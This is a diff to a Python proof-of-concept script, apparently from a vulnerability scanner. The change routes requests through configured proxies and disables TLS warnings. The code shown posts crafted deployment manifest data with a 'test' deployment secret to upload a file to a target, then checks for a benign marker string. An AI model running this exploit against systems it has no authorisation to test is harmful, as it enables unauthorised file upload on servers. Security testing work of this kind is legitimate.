@@ -2,13 +2,14 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-import requests.packages.urllib3
 import random
 import string
-from Config.config_requests import ua
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
+
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -100,7 +101,7 @@ def Agent(ver_url):
                   "localManifestPath": "a7",
                   "localPayloadPath": "a8",
                   "localObfuscationMapPath": "a9" }
-    requests.post(ver_url, headers=headers, json=json_data, verify=False)
+    requests.post(ver_url, headers=headers, json=json_data, verify=False,proxies=proxies)
 
 
 def poc(target):
@@ -123,8 +124,8 @@ def poc(target):
         "X-Deployment-Secret": "test"
     }
     json_data = {"contextData": "a3", "manifestContent": content, "objectId": "a2"}
-    requests.post(url, headers=headers, json=json_data, verify=False, timeout=5)
-    poc_res = requests.get(url=poc_url, headers=headers, verify=False)
+    requests.post(url, headers=headers, json=json_data, verify=False, timeout=5,proxies=proxies)
+    poc_res = requests.get(url=poc_url, headers=headers, verify=False,proxies=proxies)
     if "this is a friendly test, Please check and repair upload vulnerabilities." in poc_res.text:
         result['poc'] = NAME
         result['poc_url'] = poc_url
